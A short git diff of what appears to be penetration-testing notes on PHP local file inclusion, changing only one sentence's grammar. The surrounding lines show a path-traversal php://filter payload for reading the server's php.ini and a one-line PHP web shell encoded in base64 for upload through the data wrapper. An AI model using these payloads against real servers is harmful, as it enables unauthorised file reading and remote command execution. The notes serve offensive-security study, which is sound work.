@@ -69,7 +69,7 @@ php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2
 - Try different versions starting from the latest and keep going for earlier versions.
 - Base64 decode the output and find the setting for `allow_url_include`.
 
-If it is set to on, then the `Data` wrapper can be used to be upload data, in this case, a web shell is the winner.
+If it is set to on, then the `Data` wrapper can be used to upload data, in this case, a web shell is the winner.
 - The data could be uploaded encoded as Base64:
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' | base64
